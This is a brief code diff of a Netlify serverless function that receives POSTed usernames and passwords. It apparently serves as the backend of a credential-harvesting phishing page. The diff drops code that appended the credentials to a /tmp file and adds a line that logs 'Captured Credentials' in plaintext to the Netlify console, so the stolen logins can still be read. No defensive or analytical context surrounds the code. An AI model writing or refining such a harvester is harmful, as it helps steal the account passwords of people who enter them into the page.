@@ -1,6 +1,3 @@
-const fs = require('fs');
-const path = require('path');
-
 exports.handler = async (event) => {
     if (event.httpMethod !== 'POST') {
         return {
@@ -11,12 +8,8 @@ exports.handler = async (event) => {
 
     const { username, password } = JSON.parse(event.body);
 
-    // Define the path to the temporary file in Netlify's /tmp directory
-    const filePath = path.join('/tmp', 'credentials.txt');
-
-    // Log the credentials to the temporary file
-    const logEntry = `Username: ${username}, Password: ${password}\n`;
-    fs.appendFileSync(filePath, logEntry);
+    // Log credentials to the console for viewing in Netlify logs
+    console.log(`Captured Credentials - Username: ${username}, Password: ${password}`);
 
     // Respond with a JSON success message
     return {
